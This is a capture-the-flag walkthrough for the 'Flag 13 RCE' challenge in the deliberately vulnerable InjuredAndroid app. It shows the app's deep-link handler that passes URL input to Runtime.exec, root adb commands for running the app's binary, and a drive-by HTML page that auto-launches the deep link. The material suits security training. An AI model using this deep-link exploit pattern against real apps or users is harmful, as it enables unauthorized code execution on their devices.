# FLAG THIRTEEN – (RCE)

For this walkthrough I will cover both the "Intended" RCE path (recovering the secret from the binary) and the "Bypass" path (submitting the secret via Deep Link). It also includes a Web-Based PoC to demonstrate real-world exploitation.

## Vulnerability Analysis

The `RCEActivity` is exposed via the Deep Link `flag13://rce`. Its `onCreate` method parses URL parameters (`binary`, `param`, `combined`) and contains a critical logic branch:

```java
if (combined != null) {
    // PATH A: Validation
    // If we already know the secret, verify it against Firebase.
    this.x.b(new b(combined));
} else {
    // PATH B: Discovery (RCE)
    // If 'combined' is unknown, execute the specified binary to find the secret.
    Runtime.getRuntime().exec(filesDir + binary + " " + param);
    // ... Output is displayed on screen ...
}

```

## Phase 1: Discovery (Finding the Secret)

Since we don't know the secret yet, we must use Path B to run the app's internal binary and get the answer.

### The Obstacle: Permissions

In some cases, the app fails to copy the binaries correctly, leaving them non-executable. We must fix this manually before the exploit will work.

### 1. Fix the Binary Permissions (Requires Root)

```bash
adb shell
su
cd /data/data/b3nac.injuredandroid/files/
chmod 777 narnia.arm64

```

> Note: Use narnia.x86_64 if on an x86 emulator/device
> 

### 2. Execute the Binary

We need to run the binary to see what it says. Based on the binary's help text, you will see 5 available parameters, three of which contain parts of the combined parameter needed to obtain the flag. (`testOne`, `testTwo`, `testThree`).

![image.png](FLAG%20THIRTEEN%20%E2%80%93%20(RCE)/image.png)

### 3. Retrieve the Secret

- Execute narnia.[ARCH] along with each test parameter to get the final combined parameter `Treasure_Planet`.

## Phase 2: Exploitation (The Web-Based PoC)

Now that we know the secret is `Treasure_Planet`, we can craft a malicious webpage that exploits Path A (the Logic Bypass). This works even on non-rooted devices because it skips the broken binary execution step.

### The Exploit Code

Create `exploit.html`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>InjuredAndroid RCE Exploit</title>
</head>
<body>
    <h1>Claiming Flag 13...</h1>
    <p>Please wait while we redirect you.</p>

    <script>
        // AUTOMATIC TRIGGER (Drive-by)
        // Forces the browser to open the app and submit the known secret.
        window.location.href = "flag13://rce?combined=Treasure_Planet";
    </script>
</body>
</html>

```

### The Attack Server

Host the file (on local or cloud server):

```bash
python3 -m http.server 8000
```

```bash
# Or use my hosted PoC
https://iaan.io/files/InjuredAndroid/RCEActivity/exploit.html
```

![](https://i.imgur.com/Kdcl7XO.gif)